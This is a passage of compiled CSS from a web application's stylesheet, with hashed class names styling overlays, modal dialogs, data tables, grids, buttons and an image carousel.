        fill: #e9162b
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._1Mc8GEI6jcOx9Aq5NxIwZJ {
        display: flex;
        justify-content: center;
        align-items: center
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._34-ajilwix5OSEzIWsSOH6 {
        position: absolute;
        top: 0;
        right: -20px;
        bottom: 0;
        left: -20px;
        background: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 0 0 8px 8px;
        z-index: 100
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._34-ajilwix5OSEzIWsSOH6 ._3K7FeT08ac4jvPLQtOAHHW {
        display: flex;
        flex-direction: column;
        align-items: center
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._34-ajilwix5OSEzIWsSOH6 ._3K7FeT08ac4jvPLQtOAHHW ._2VahunzBGsIbAEZlv0_Vhy {
        font-size: 20px;
        font-weight: 600;
        color: #fff
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._34-ajilwix5OSEzIWsSOH6 ._3K7FeT08ac4jvPLQtOAHHW ._3rtzSm_G3q6o2j6tZ4Rq2D {
        margin-top: 20px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._34-ajilwix5OSEzIWsSOH6 ._3K7FeT08ac4jvPLQtOAHHW ._3t4BXjOXdMGsCkJVRJWpGK {
        margin-top: 30px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._34-ajilwix5OSEzIWsSOH6 ._3K7FeT08ac4jvPLQtOAHHW ._1g2BW-Tljkeoyh416MJY79 {
        color: #fff;
        margin-top: 10px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._34-ajilwix5OSEzIWsSOH6 ._3K7FeT08ac4jvPLQtOAHHW ._1g2BW-Tljkeoyh416MJY79 span {
        display: inline-block;
        color: #0080f7
    }

    ._1eMO5UsA0tjwQTSi42p6wH {
        width: 16px !important;
        height: 16px !important
    }

    ._1eMO5UsA0tjwQTSi42p6wH ._3YtnFPK1HCizxjXE2vpGCK {
        position: relative
    }

    ._1eMO5UsA0tjwQTSi42p6wH ._3YtnFPK1HCizxjXE2vpGCK:hover ._2yrHm_8uTgd00V7A-b4R2n {
        display: block
    }

    ._1eMO5UsA0tjwQTSi42p6wH ._3YtnFPK1HCizxjXE2vpGCK._3QbOlhzNBBknfWHUzWkISI ._2QNVRziILWFTJqGyWPBZIq {
        display: block
    }

    ._1eMO5UsA0tjwQTSi42p6wH ._3YtnFPK1HCizxjXE2vpGCK ._3cScQaUuNaft8hzKDOzQUu {
        position: relative;
        z-index: 101;
        cursor: pointer
    }

    ._1eMO5UsA0tjwQTSi42p6wH ._3YtnFPK1HCizxjXE2vpGCK ._3cScQaUuNaft8hzKDOzQUu svg {
        cursor: pointer
    }

    ._1eMO5UsA0tjwQTSi42p6wH ._3YtnFPK1HCizxjXE2vpGCK ._2S89ctHJRNWHA9VOH-YxM8 {
        font-size: 10px;
        color: #fff;
        margin-bottom: 10px;
        text-align: center
    }

    ._1eMO5UsA0tjwQTSi42p6wH ._3YtnFPK1HCizxjXE2vpGCK ._2yrHm_8uTgd00V7A-b4R2n {
        display: none;
        position: absolute;
        bottom: 0;
        right: 0;
        padding: 16px;
        z-index: 999
    }

    ._1eMO5UsA0tjwQTSi42p6wH ._3YtnFPK1HCizxjXE2vpGCK ._2QNVRziILWFTJqGyWPBZIq {
        padding: 12px;
        background: #555;
        box-shadow: 0px 4px 4px rgba(0, 0, 0, 0.08);
        border-radius: 4px;
        width: 140px
    }

    .NVYG0SDcjck7jSyrM94bp {
        position: absolute !important;
        top: 0 !important;
        left: 0 !important;
        right: 0 !important;
        bottom: 0 !important;
        z-index: 9999 !important;
        border-radius: 0 0 6px 6px !important
    }

    .NVYG0SDcjck7jSyrM94bp ._3K2qlf29wZvw8p0zvR9OMY {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        display: flex;
        justify-content: center
    }

    .NVYG0SDcjck7jSyrM94bp ._3K2qlf29wZvw8p0zvR9OMY ._1yCGtnDh70FhONEmiVeE48 {
        margin-top: 80px;
        background: #fff;
        border-radius: 6px;
        max-width: 320px;
        padding: 24px 40px
    }

    .NVYG0SDcjck7jSyrM94bp ._3K2qlf29wZvw8p0zvR9OMY ._1yCGtnDh70FhONEmiVeE48 * {
        text-align: center
    }

    .NVYG0SDcjck7jSyrM94bp ._3K2qlf29wZvw8p0zvR9OMY ._1yCGtnDh70FhONEmiVeE48 ._2u1LIdhDfzdziExB0cyqdg {
        margin-top: 20px
    }

    .NVYG0SDcjck7jSyrM94bp ._3K2qlf29wZvw8p0zvR9OMY ._1yCGtnDh70FhONEmiVeE48 ._2QGHtvEdi2QPoyibZTr7ae {
        padding-top: 8px
    }

    .NVYG0SDcjck7jSyrM94bp ._3K2qlf29wZvw8p0zvR9OMY ._1yCGtnDh70FhONEmiVeE48 ._2QGHtvEdi2QPoyibZTr7ae span {
        color: #1e96fc
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l {
        padding: 0px 20px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._26LcryEQtiKZGDrEIGgjq6 {
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._26LcryEQtiKZGDrEIGgjq6 ._3GMIzkJI13SMWwPBozeVZ4 {
        display: inline-flex;
        align-items: center
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._26LcryEQtiKZGDrEIGgjq6 ._3GMIzkJI13SMWwPBozeVZ4 ._2Gz-i8e93y22ZiDIz7RWCD {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._26LcryEQtiKZGDrEIGgjq6:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px;
        border-bottom: 1px solid #e2e4e5
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi {
        position: sticky;
        top: 0;
        padding-top: 20px;
        display: grid;
        grid-template-columns: 0.75fr 70px 1fr;
        padding-bottom: 10px;
        background: #fff;
        border-bottom: 1px solid #e2e4e5;
        z-index: 1000
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._3wz51H6BTCdImuAyfPPOxm {
        display: grid;
        grid-template-columns: 68px 1fr
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._3wz51H6BTCdImuAyfPPOxm .EM6dPdBYnN9_MME4JviBr {
        width: 68px;
        height: 68px;
        margin-right: 10px;
        display: flex;
        border-radius: 4px;
        overflow: hidden
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._3wz51H6BTCdImuAyfPPOxm .EM6dPdBYnN9_MME4JviBr img {
        max-width: 100%;
        width: 100%
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._3wz51H6BTCdImuAyfPPOxm .rumb2a2sMTqTeoDAk89dK {
        padding-left: 10px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._3wz51H6BTCdImuAyfPPOxm .rumb2a2sMTqTeoDAk89dK ._3SiSS3E30kexLYhdU95RWe {
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._3wz51H6BTCdImuAyfPPOxm .rumb2a2sMTqTeoDAk89dK ._3SiSS3E30kexLYhdU95RWe:hover {
        color: var(--ah-primary-hover)
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._3wz51H6BTCdImuAyfPPOxm .rumb2a2sMTqTeoDAk89dK ._3OA4z9SreY_ukroP3s_fb4 {
        display: flex;
        align-items: center;
        margin-top: 5px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._3wz51H6BTCdImuAyfPPOxm .rumb2a2sMTqTeoDAk89dK ._3OA4z9SreY_ukroP3s_fb4 span {
        display: inline-flex
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._2jyPIypbuHwjZ3xdwZpyEs {
        display: grid;
        grid-template-columns: 100px 100px 100px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._2jyPIypbuHwjZ3xdwZpyEs ._387v3ZXGBAyH5dstk7LPB2 {
        color: #2e2e2e
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1rQrscnIf3JNUYNCfM8Lyi ._2jyPIypbuHwjZ3xdwZpyEs .QxsGTZSvou5m0mAynj5mO {
        font-size: 14px;
        font-weight: 700;
        color: #2e2e2e
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3kmPAczeqiNJxQG5lL4JeT {
        position: relative;
        padding-top: 20px;
        min-height: 300px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3kmPAczeqiNJxQG5lL4JeT ._1LosxMGaYjTq9v8J7Ug7do {
        position: absolute;
        top: 0;
        left: -20px;
        right: -20px;
        bottom: 0;
        border-radius: 0 0 6px 6px;
        overflow: hidden;
        z-index: 999999
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._28oLCOO4ounL58jSl2d4E8 {
        position: absolute;
        top: 0;
        right: -20px;
        bottom: 0;
        left: -20px;
        background: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 0 0 8px 8px;
        z-index: 100
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._28oLCOO4ounL58jSl2d4E8 .uwS2_LEfUt444mZ9FfjFP {
        display: flex;
        flex-direction: column;
        align-items: center
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._28oLCOO4ounL58jSl2d4E8 .uwS2_LEfUt444mZ9FfjFP ._2s1NsscM1Q3KI3PxwrZ8VO {
        font-size: 20px;
        font-weight: 600;
        color: #fff
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._28oLCOO4ounL58jSl2d4E8 .uwS2_LEfUt444mZ9FfjFP ._2ZKD_Q7BKLy89J5g-HJim3 {
        margin-top: 20px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._28oLCOO4ounL58jSl2d4E8 .uwS2_LEfUt444mZ9FfjFP ._333RLSshKmUuXtejyrWlTv {
        margin-top: 30px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._28oLCOO4ounL58jSl2d4E8 .uwS2_LEfUt444mZ9FfjFP ._3cXrfhiUJUD9PhHABHd2Sn {
        color: #fff;
        margin-top: 10px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._28oLCOO4ounL58jSl2d4E8 .uwS2_LEfUt444mZ9FfjFP ._3cXrfhiUJUD9PhHABHd2Sn span {
        display: inline-block;
        color: #0080f7
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu {
        display: table;
        width: 100%
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._3w-G3VUZXs-8LtvloSnvz4 {
        display: table-header-group
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._3w-G3VUZXs-8LtvloSnvz4 ._1DtVIAKTsrH1MdvMO88w1U {
        display: table-row
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._3w-G3VUZXs-8LtvloSnvz4 ._1DtVIAKTsrH1MdvMO88w1U ._3Fg1c9Ig1UAMgX3HnmpEWa {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._3w-G3VUZXs-8LtvloSnvz4 ._1DtVIAKTsrH1MdvMO88w1U ._3Fg1c9Ig1UAMgX3HnmpEWa.dANwOn3nZLOr3xdQlT9mF {
        width: 38%
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._3w-G3VUZXs-8LtvloSnvz4 ._1DtVIAKTsrH1MdvMO88w1U ._3Fg1c9Ig1UAMgX3HnmpEWa.LAVlxJhC_cYNN6DXP6EU7 {
        width: 20%
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._3w-G3VUZXs-8LtvloSnvz4 ._1DtVIAKTsrH1MdvMO88w1U ._3Fg1c9Ig1UAMgX3HnmpEWa.gs_A2BvGPskRMUC3Q_rx3 {
        width: 20%
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._3w-G3VUZXs-8LtvloSnvz4 ._1DtVIAKTsrH1MdvMO88w1U ._3Fg1c9Ig1UAMgX3HnmpEWa._2Ym6WiD_0E973S5fEpv4bm {
        width: 22%
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._3w-G3VUZXs-8LtvloSnvz4 ._1DtVIAKTsrH1MdvMO88w1U ._3Fg1c9Ig1UAMgX3HnmpEWa:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._3w-G3VUZXs-8LtvloSnvz4 ._1DtVIAKTsrH1MdvMO88w1U ._3Fg1c9Ig1UAMgX3HnmpEWa:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG {
        display: table-header-group
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG ._1DtVIAKTsrH1MdvMO88w1U {
        display: table-row
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG ._1DtVIAKTsrH1MdvMO88w1U ._1rXhHS_pRNZA-Sr8b9Qm_d {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG ._1DtVIAKTsrH1MdvMO88w1U ._1rXhHS_pRNZA-Sr8b9Qm_d.Ndd74BP2DVVQhsfYH0pUy * {
        cursor: pointer
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG ._1DtVIAKTsrH1MdvMO88w1U ._1rXhHS_pRNZA-Sr8b9Qm_d ._3GzFwp6437dMFoO9eHZEWx {
        width: 60px;
        height: 60px;
        border-radius: 4px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG ._1DtVIAKTsrH1MdvMO88w1U ._1rXhHS_pRNZA-Sr8b9Qm_d .u1KdXrC1MNVLcpdkyfoVV {
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG ._1DtVIAKTsrH1MdvMO88w1U ._1rXhHS_pRNZA-Sr8b9Qm_d ._3SiSS3E30kexLYhdU95RWe {
        width: 200px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        padding-right: 16px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG ._1DtVIAKTsrH1MdvMO88w1U ._1rXhHS_pRNZA-Sr8b9Qm_d ._3SiSS3E30kexLYhdU95RWe:hover {
        color: var(--ah-primary-hover)
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG ._1DtVIAKTsrH1MdvMO88w1U ._1rXhHS_pRNZA-Sr8b9Qm_d ._1qQqpOE2m9Bal8_AF2L5An {
        max-width: 200px;
        line-height: 36px;
        text-overflow: ellipsis;
        white-space: nowrap;
        overflow: hidden;
        color: #006fe3;
        cursor: pointer
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3OJ1b5Arj8D5Td-AVD7ozu ._2twMuFnmXhV9-qE4C6PsxG ._1DtVIAKTsrH1MdvMO88w1U ._1rXhHS_pRNZA-Sr8b9Qm_d ._1qQqpOE2m9Bal8_AF2L5An:hover {
        color: var(--ah-primary-hover)
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3SegNcaiLNlOBmXxx8gEe- {
        display: flex;
        justify-content: space-between;
        align-items: center
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3SegNcaiLNlOBmXxx8gEe- ._1sHyGN8OxsCLUdWk3rb3zL {
        display: inline-flex;
        justify-content: center;
        align-items: center
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3SegNcaiLNlOBmXxx8gEe- ._2MqjfMhsForwf5rGlzQy2y {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .mxc90pHXjBiL00YhOruWY {
        display: grid;
        grid-template-columns: 1fr 1fr 1fr;
        gap: 30px 44px;
        margin-top: 20px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .ljaq1nr56qSVJYburbi_V {
        display: grid;
        grid-template-columns: 1fr 0.9fr;
        gap: 10px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .ljaq1nr56qSVJYburbi_V ._367ZVqYOq_QQDOxbybwpfa {
        margin-top: 28px;
        max-width: 460px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .ljaq1nr56qSVJYburbi_V ._367ZVqYOq_QQDOxbybwpfa img {
        width: 100%
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .ljaq1nr56qSVJYburbi_V ._18Lza9OVjwB87o1SRcTBLY {
        margin-top: 20px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        user-select: none;
        padding: 6px 8px;
        border-radius: 4px;
        font-size: 14px;
        color: #fff;
        background-color: var(--ah-primary);
        height: 42px;
        line-height: 42px;
        width: 260px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .ljaq1nr56qSVJYburbi_V ._18Lza9OVjwB87o1SRcTBLY:hover {
        background-color: var(--ah-primary-hover)
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .ljaq1nr56qSVJYburbi_V ._1y-J35BkFUjgZ2FiZFIS8d {
        cursor: default;
        background: var(--ah-grey-500)
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .ljaq1nr56qSVJYburbi_V ._1y-J35BkFUjgZ2FiZFIS8d:hover {
        background: var(--ah-grey-500)
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .ljaq1nr56qSVJYburbi_V .Tf79qjf3PWGVlUypO215j {
        display: inline-flex;
        margin-top: 10px;
        align-items: center
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l .ljaq1nr56qSVJYburbi_V .Tf79qjf3PWGVlUypO215j ._1G67yhB0A-dcps3jWhTAaG {
        width: 26px;
        color: var(--ah-primary);
        padding-right: 10px;
        font-size: 20px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3jCGoKBC2KE0lDU_0TLP9h ._3tT00JzkLvElBO595ABwBE {
        height: 180px;
        margin-bottom: 10px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3jCGoKBC2KE0lDU_0TLP9h .WTQrX_zaQshvIc9JOSXIs {
        margin-bottom: 8px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3jCGoKBC2KE0lDU_0TLP9h ._3YPeBPEfVCKG4LFiO9AZ-V {
        width: 100px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1YJ4UbrcQ6c7xDVMjNSLHI {
        padding: 50px 0
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1YJ4UbrcQ6c7xDVMjNSLHI ._3nivmYXZ050u69Qz9NlIKM {
        margin-bottom: 50px;
        height: 328px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: contain
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1YJ4UbrcQ6c7xDVMjNSLHI .SdiETVe9vUH9I9jWDfgZf {
        font-weight: 700;
        color: var(--ah-grey-100);
        text-align: center
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._1YJ4UbrcQ6c7xDVMjNSLHI ._3DtI_Ys24qplrxHAQ46lpi {
        font-weight: 700;
        color: var(--ah-yellow-300);
        display: inline-block;
        margin-right: 4px
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3_E8rZ9S20SI4zoZXW-9OR {
        cursor: pointer;
        text-align: center;
        margin-bottom: 16px;
        text-decoration: underline;
        color: var(--ah-red-100);
        text-decoration-color: var(--ah-red-100)
    }

    ._1YvSTqo1_D_fB9_5s_4MWh._1-G1Y4cJib-StCShVoFF1l ._3_E8rZ9S20SI4zoZXW-9OR:hover {
        cursor: pointer
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._3N4j42FGjLPZd4-WqUspU5 {
        display: flex;
        align-items: center;
        padding: 32px 38px;
        position: relative
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._3aXHm21x_v4tpAaRBk_ziq {
        margin-right: 64px;
        position: relative
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._3aXHm21x_v4tpAaRBk_ziq .M_UqpnOe0BbBSPAN6G2EX {
        margin-top: 16px;
        align-items: center;
        display: flex;
        justify-content: center
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._3aXHm21x_v4tpAaRBk_ziq .M_UqpnOe0BbBSPAN6G2EX>div {
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._3bEAeszOyWBwf3atDzqEB8 {
        width: 400px;
        height: 400px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
        border-radius: 4px
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._3bEAeszOyWBwf3atDzqEB8>div {
        height: 80px;
        background-size: cover;
        background-repeat: no-repeat;
        background-position: center;
        border-radius: 4px
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._2gTHVPVuar5GPn8gOHQJan {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 12px
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._2gTHVPVuar5GPn8gOHQJan .U5AIg2G7HmSYUzmIF9duu {
        display: inline-flex;
        align-items: center;
        justify-content: space-between
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._2gTHVPVuar5GPn8gOHQJan ._1s3MJuI2R_OSLiBhqHLEzj {
        font-weight: 600;
        color: var(--ah-grey-100);
        margin-left: 8px
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._2gTHVPVuar5GPn8gOHQJan ._1AaCO4buwltkV5rDdWNzcc {
        color: #969696;
        font-size: 11px;
        line-height: 24px
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._3NMmMxx14sP132lDEYzm0k {
        margin-bottom: 13px;
        display: flex;
        align-items: center
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._3NMmMxx14sP132lDEYzm0k ._1Lt8xARoEKPREp98EEPeko {
        margin-left: 8px
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._79KefpMIpV629O7ywKnSQ {
        color: #2e2e2e
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD {
        position: absolute;
        left: 0;
        right: 0;
        width: 100%;
        display: flex;
        justify-content: space-between;
        height: 0;
        top: 50%
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._3UC2avHXsp5Poh0dwzSHhg,
    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._1SH-uXy0IXz8A8pUaXULKg {
        cursor: pointer;
        user-select: none;
        width: 40px;
        height: 150px;
        display: flex;
        align-items: center;
        justify-content: center;
        transform: translateY(-50%)
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._3UC2avHXsp5Poh0dwzSHhg svg path,
    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._1SH-uXy0IXz8A8pUaXULKg svg path {
        fill: var(--ah-red-100)
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._3UC2avHXsp5Poh0dwzSHhg:hover svg path,
    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._1SH-uXy0IXz8A8pUaXULKg:hover svg path {
        fill: var(--ah-red-100)
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._3UC2avHXsp5Poh0dwzSHhg:active svg path,
    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._1SH-uXy0IXz8A8pUaXULKg:active svg path {
        fill: var(--ah-red-300)
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._3UC2avHXsp5Poh0dwzSHhg[disabled],
    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._1SH-uXy0IXz8A8pUaXULKg[disabled] {
        pointer-events: none
    }

    ._1EYdoIIBt4jdXGnS7PxLT9 ._1S1Jmzeh5z-X6Oi_WwWEqD ._3UC2avHXsp5Poh0dwzSHhg[disabled] *,
